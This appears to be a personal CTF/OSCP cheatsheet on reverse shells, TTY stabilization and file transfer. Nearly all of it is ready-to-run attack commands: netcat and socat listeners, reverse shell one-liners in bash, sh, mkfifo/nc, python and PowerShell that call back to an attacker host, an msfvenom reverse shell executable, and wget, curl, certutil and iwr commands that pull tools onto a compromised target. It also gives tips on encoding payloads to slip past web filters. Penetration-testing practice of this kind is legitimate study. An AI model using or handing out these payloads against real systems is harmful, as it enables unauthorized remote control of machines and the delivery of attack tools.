---
tags: [hacking, ctf, oscp, shell, reverse-shell]
type: cheatsheet
source: compiled reference (reverse shells & TTY upgrade)
last-verified: 2026-09-02
---

# Shell Stabilization

## Up
- [[CTF]]

Once you have code execution, you need a **reverse shell**, and then to **upgrade it to a stable, interactive TTY** so `Ctrl-C`, `sudo`, `su`, tab-completion, and full-screen tools (vim, `less`) work. A raw netcat shell is fragile — stabilize it before enumerating.

---

## Catch the Shell (listener)

```bash
nc -lvnp 443                          # basic netcat listener
rlwrap nc -lvnp 443                   # rlwrap adds arrow-keys/history (nicer)
# or use pwncat-cs / penelope for auto-stabilizing listeners
pwncat-cs -lp 443
```

Use a common outbound port (443/80/53) — egress filtering often allows those.

---

## Reverse Shell Payloads

```bash
# bash
bash -i >& /dev/tcp/$LHOST/443 0>&1
# sh (more portable)
sh -i >& /dev/tcp/$LHOST/443 0>&1
# mkfifo (when bash -i is blocked)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $LHOST 443 >/tmp/f

# python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("'$LHOST'",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];import pty;pty.spawn("/bin/bash")'

# powershell (Windows) — Nishang / one-liner
powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('LHOST',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sy=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sy,0,$sy.Length);$s.Flush()}"
```

- **revshells.com** mentality: keep a mental menu (bash, sh, mkfifo, python, nc, powershell, `msfvenom`).
- URL-encode payloads when injecting via web params. Watch for filtered chars (`&`, spaces → `${IFS}`).
- Windows: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe -o s.exe`.

---

## Upgrade to a Full TTY (Linux) — the classic sequence

```bash
# 1) spawn a PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
#   (fallbacks: script -qc /bin/bash /dev/null ; or perl -e 'exec "/bin/bash";')

# 2) background the shell
Ctrl-Z

# 3) on YOUR box: pass through key signals + raw mode
stty raw -echo; fg
#   (press Enter a couple times)

# 4) back in the shell: set term + size
export TERM=xterm
stty rows 50 cols 200        # match your terminal (get values with `stty size` locally)
```

Now `Ctrl-C`, `su`, `sudo`, vim, tab-completion all work. If the shell dies, `reset` your local terminal.

### Quick alternatives
```bash
# socat (fully interactive) — upload socat to target, then:
# attacker:
socat file:`tty`,raw,echo=0 tcp-listen:443
# target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:443
```

---

## Serving & Transferring Files

```bash
# attacker: serve tools (LinPEAS, exploits, socat, chisel)
python3 -m http.server 80
# linux target: pull
wget http://$LHOST/linpeas.sh -O /tmp/lp.sh || curl http://$LHOST/linpeas.sh -o /tmp/lp.sh
# windows target: pull
certutil -urlcache -f http://LHOST/nc.exe nc.exe
powershell -c "iwr http://LHOST/winPEASx64.exe -o wp.exe"
# base64 fallback when no transfer works
base64 -w0 file        # on source; decode on target
```

Writable dirs: Linux `/tmp` `/dev/shm`; Windows `C:\Windows\Temp` `C:\Users\Public`.

---

## Tips

- **Stabilize before you sudo** — a dumb shell can't handle password prompts.
- Match `rows/cols` or vim/less will look broken.
- Keep a **second shell** open (re-trigger the foothold) before risky actions — losing the shell mid-privesc is painful.
- Consider **chisel/ligolo-ng** for port-forwarding/pivoting once inside (multi-host THM/HTB/AD).
- **Next:** [[Privilege Escalation]] → run local enumeration as the new user.
